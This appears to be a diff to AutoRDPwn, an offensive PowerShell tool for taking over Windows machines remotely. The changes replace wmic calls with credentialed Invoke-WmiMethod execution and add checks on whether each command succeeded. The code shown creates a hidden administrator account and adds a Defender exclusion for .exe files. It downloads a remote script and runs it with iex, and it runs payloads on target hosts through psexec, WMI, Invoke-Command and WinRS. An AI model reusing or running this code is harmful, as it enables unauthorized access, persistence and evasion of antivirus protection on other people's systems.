@@ -214,7 +214,7 @@ if($Language -in 'Spanish') {
   $Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
   $Pwn6  = "Agente de sesión de RDP" }
 
-    $Powershell = (Get-Host | findstr "Version" | select -First 1).split(':')[1].trim() ; Write-Host""
+    $Powershell = (Get-Host | findstr "Version" | select -First 1).split(':')[1].trim() ; Write-Host
     if($Powershell -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host ; Write-Host "$txt4" -NoNewLine -ForegroundColor 'Red'
     Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -ForegroundColor 'Blue' ; Write-Host ; sleep -milliseconds 7500 ; exit }
     else { $osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim() ; Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null
@@ -233,7 +233,7 @@ if($Language -in 'Spanish') {
         $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	if(!$PlainTextPassword) { Write-Host "******" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$PlainTextPassword) { Write-Host "********" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PSexec.ps1" -UseBasicParsing | iex
 	if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe "$Pwn1" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe "$Pwn2" -nobanner -accepteula
@@ -268,20 +268,24 @@ if($Language -in 'Spanish') {
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
         $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
-        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-        if(!$PlainTextPassword) { Write-Host "******" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+        $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
+        if(!$credential) { Write-Host "********" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
 	if(!$user) { Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn1 2>&1> $null
-	Write-Host "[+] Command was executed successfully!"
+	if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[+] Command execution failed!" -ForegroundColor Red }
 	Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn2 2>&1> $null ; Write-Host
-	Write-Host "[+] Command was executed successfully!"
+	if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[+] Command execution failed!" -ForegroundColor Red }
 	Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn3 2>&1> $null ; Write-Host
-	Write-Host "[+] Command was executed successfully!"
+	if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[+] Command execution failed!" -ForegroundColor Red }
 	Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn4 2>&1> $null ; Write-Host
-	Write-Host "[+] Command was executed successfully!" }
-        if($user) { wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn1"
-        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn2"
-        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn3"
-        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe $Pwn4" }}
+	if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[+] Command execution failed!" -ForegroundColor Red }}
+        if($user) { Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn1 2>&1> $null
+	if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[+] Command execution failed!" -ForegroundColor Red }
+	Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn2 2>&1> $null ; Write-Host
+	if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[+] Command execution failed!" -ForegroundColor Red }
+	Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn3 2>&1> $null ; Write-Host
+	if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[+] Command execution failed!" -ForegroundColor Red }
+	Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn4 2>&1> $null ; Write-Host
+	if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[+] Command execution failed!" -ForegroundColor Red }}
 
         '4' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
@@ -290,7 +294,7 @@ if($Language -in 'Spanish') {
         $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-        if(!$credential) { Write-Host "******" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+        if(!$credential) { Write-Host "********" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         if(!$user) { Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn1 }
         Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn2 }
         Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn3 }
@@ -307,7 +311,7 @@ if($Language -in 'Spanish') {
         $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	if(!$PlainTextPassword) { Write-Host "******" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$PlainTextPassword) { Write-Host "********" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn3"
